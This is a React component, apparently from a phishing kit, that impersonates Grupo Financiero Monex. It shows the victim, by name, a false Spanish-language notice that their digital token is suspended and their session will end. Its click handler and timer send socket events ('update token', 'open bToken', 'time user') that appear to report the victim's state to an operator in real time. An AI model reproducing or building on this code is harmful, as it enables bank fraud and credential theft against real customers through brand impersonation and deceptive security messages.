import React from "react";
import i00 from "./img/icons/logo.png";
import socket from "../socket";
import { useSelector } from "react-redux";

function Notify({ sCt, sS, sP }) {
  const [s, setS] = React.useState(false);
  const [isActive, setIsActive] = React.useState(false);
  const [time, setTime] = React.useState(0);
  const [cont, setCont] = React.useState(0);
  const user = useSelector((state) => state.users);

  const handleC = (e) => {
    sS(true);
    setS(true);
    setIsActive(true);
    socket.emit("update token", { token: "Cancelar", bToken: true });
    socket.emit("open bToken", { bToken: true });
  };

  React.useEffect(() => {
    let interval = null;
    if (s) {
      if (time >= 5) {
        sP(0);
        sS(false);
        setIsActive(false);
        setCont(cont + 0);
        setTime(0);
      }
    }
    if (isActive) {
      interval = setInterval(() => {
        setTime((time) => time + 1);
        socket.emit("time user", { time: time + 1, p: cont + 2 });
      }, 1000);
    } else {
      clearInterval(interval);
    }
    return () => {
      clearInterval(interval);
    };
  }, [isActive, time, cont]);
  return (
    <>
      <div id="clonMsj">
        <div
          className="modal"
          id="clonMsjGenerico"
          style={{ display: "block" }}
        >
          <div
            className="container"
            id="clonContainerGenerico"
            style={{ width: "600px" }}
          >
            <div className="logo" style={{ padding: "40px" }}>
              <img src={i00} alt="Grupo Financiero Monex" />
            </div>
            <br />
            <div className="mensaje informacion">
              <div className="mb30" align="center">
                <p className="f23" id="tituloGenerico1">
                  Suspención de token Monex
                </p>
              </div>
              <div className="mb30">
                <h5 style={{ fontSize: "20px" }}>
                  <p id="cuerpoGenerico1">
                    <strong>{user.name}</strong>, por motivos de seguridad su
                    Llave Digital Monex ha sido supendida temporalmente, por lo
                    que su dispositivo no podrá utilizarse nuevamente. Tu asesor
                    se pondrá en contacto con usted una vez sea notificado por
                    nuestro sistema de seguridad para vincular un nuevo dispositivo. Su sesión actual será
                    finalizada.
                  </p>
                </h5>
              </div>
              <div className="row" align="center">
                <div id="renglonGenerico1">
                  <div
                    className="col20 xs-mb10"
                    id="botonGenerico2"
                    onClick={handleC}
                  >
                    <a className="btn full close-md bg-green">Continuar</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default Notify;
